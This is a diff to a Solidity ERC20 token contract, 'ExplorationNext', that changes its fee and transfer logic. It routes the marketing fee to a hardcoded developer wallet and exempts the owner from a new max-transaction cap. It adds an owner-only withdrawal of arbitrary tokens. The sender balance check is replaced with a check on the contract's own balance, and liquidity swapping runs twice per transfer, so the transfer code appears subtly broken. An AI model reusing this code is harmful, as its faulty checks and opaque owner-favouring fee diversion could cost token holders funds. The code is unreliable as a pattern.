@@ -7,13 +7,12 @@ import "@openzeppelin/contracts/utils/Context.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/utils/math/SafeMath.sol";
-import "@openzeppelin/contracts/security/Pausable.sol";
 
 import "./interface/IUniswapV2Router.sol";
 import "./interface/IUniswapV2Factory.sol";
 import "./interface/IUniswapV2Pair.sol";
 
-contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable, Pausable {
+contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
@@ -22,12 +21,15 @@ contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable, Pausable {
     mapping (address => mapping (address => uint256)) private _allowances;
     mapping (address => bool) private pausedAddress;
     mapping (address => bool) private _isExcluded;
+    mapping (address => bool) private _isExcludedFromFee;
     mapping (address => bool) private _isExcludedFromMaxTx;
     mapping (address => bool) private _isIncludedInFee;
     mapping (address => bool) private _previousTokenBalanceTransfered;
     address[] private _excluded;
 
     address UNISWAPV2ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+
+    address devAddress = 0xdDb9a4461e5fF9f8035770E81209979D722697D4;
    
     uint256 private constant MAX = ~uint256(0);
     uint256 private _tTotal = 387000000  * 10**18;
@@ -45,9 +47,6 @@ contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable, Pausable {
     uint256 public liquidityFee = 1;
     uint256 private previousLiquidityFee = liquidityFee;
 
-    uint256 public _transactionBurn = 1;
-    uint256 private _previousTransactionBurn = _transactionBurn;
-
     uint256 public marketingWalletFee = 1;
     uint256 private previousMarketingWalletFee = marketingWalletFee;
 
@@ -59,14 +58,20 @@ contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable, Pausable {
     bool inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
 
-    uint256 private numTokensSellToAddToLiquidity = 500000 * 10**18;    
+     
+uint256 public minLiquidity ;
+    uint256 public feeEnable;
+
+    uint256 public _maxTxAmount = 5000000 * 10**18;
+
+ uint256 private numTokensSellToAddToLiquidity = 500000 * 10**18;    
 
     event FeeEnable(bool enableFee);
     event SetMaxTxPercent(uint256 maxPercent);
     event SetTaxFeePercent(uint256 taxFeePercent);
     event ExternalTokenTransfered(address externalAddress,address toAddress, uint amount);
     event RedistributionFee(uint256 amount);
-    event liqFee(uint256 amount);
+    event liqFee(uint256 tLiquidity);
     event marketWalletFee(uint256 amount);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
     event SwapAndLiquify(uint256 tokensSwapped,uint256 ethReceived,uint256 tokensIntoLiqudity);
@@ -296,11 +301,11 @@ contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable, Pausable {
     }
 
     function takeMarketingWalletFee(uint256 rMarketingWalletFee, uint256 tMarketingWalletFee) internal {
-       if (_isExcluded[address(this)]) {
-            _rOwned[address(this)] = _rOwned[address(this)].add(rMarketingWalletFee);
+       if (_isExcluded[address(devAddress)]) {
+            _rOwned[address(devAddress)] = _rOwned[address(devAddress)].add(rMarketingWalletFee);
         } else {
-            _rOwned[address(this)] = _rOwned[address(this)].add(rMarketingWalletFee);
-            _tOwned[address(this)] = _tOwned[address(this)].add(tMarketingWalletFee);
+            _rOwned[address(devAddress)] = _rOwned[address(devAddress)].add(rMarketingWalletFee);
+            _tOwned[address(devAddress)] = _tOwned[address(devAddress)].add(tMarketingWalletFee);
         }
         emit marketWalletFee(tMarketingWalletFee);
     }
@@ -405,7 +410,6 @@ contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable, Pausable {
         emit Approval(owner, spender, amount);
     }
 
-    
     function _transfer(
         address from,
         address to,
@@ -414,22 +418,60 @@ contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable, Pausable {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
+        if(from != owner() && to != owner())
+            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
         
-        _beforeTokenTransfer(from, to);
+        //_beforeTokenTransfer(from, to);
         
-        uint256 senderBalance = balanceOf(from);
+        //uint256 senderBalance = balanceOf(from);
+        //require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        uint256 contractTokenBalance = balanceOf(address(this));
+         bool previousenableFee;
+
+         if(contractTokenBalance >= _maxTxAmount)
+        {
+            contractTokenBalance = _maxTxAmount;
+        }
         
-        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
+        if (
+            overMinTokenBalance &&
+            !inSwapAndLiquify &&
+            from != uniswapV2Pair &&
+            swapAndLiquifyEnabled
+        ) {
+            contractTokenBalance = numTokensSellToAddToLiquidity;
+            //add liquidity
+            swapAndLiquify(contractTokenBalance);
+        }
 
         //indicates if fee should be deducted from transfer
         bool takeFee = true;
         
-        //if any account belongs to _isIncludedInFee account then take fee
-        //else remove fee
-        if(!enableFee){
+         //if any account belongs to _isExcludedFromFee account then remove the fee
+        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
             takeFee = false;
         }
-         
+        if (
+            !inSwapAndLiquify &&
+            from != uniswapV2Pair &&
+            swapAndLiquifyEnabled
+        ) {
+            if (enableFee == true) {
+                previousenableFee = enableFee;
+                enableFee = false;
+            }
+            //add liquidity
+            swapAndLiquify(contractTokenBalance);
+            if (previousenableFee == true) {
+                enableFee = true;
+            }
+        }
+        require(
+            contractTokenBalance >= amount,
+            "ERC20: transfer amount exceeds balance"
+        );
+       
         //transfer amount, it will take tax, burn and charity amount
         _tokenTransfer(from,to,amount,takeFee);
     }
@@ -559,6 +601,17 @@ contract ExplorationNext is Context, IERC20, IERC20Metadata, Ownable, Pausable {
         takeMarketingWalletFee(rMarketingWalletFee, tMarketingWalletFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
+
+     function withdrawToken(address _tokenContract, uint256 _amount)
+        external
+        onlyOwner
+    {
+        require(_tokenContract != address(0), "Address cant be zero address");
+        IERC20 tokenContract = IERC20(_tokenContract);
+        tokenContract.transfer(msg.sender, _amount);
+        emit ExternalTokenTransfered(_tokenContract, msg.sender, _amount);
+    }
+
 
     function _beforeTokenTransfer(address from, address to) internal virtual { 
     }
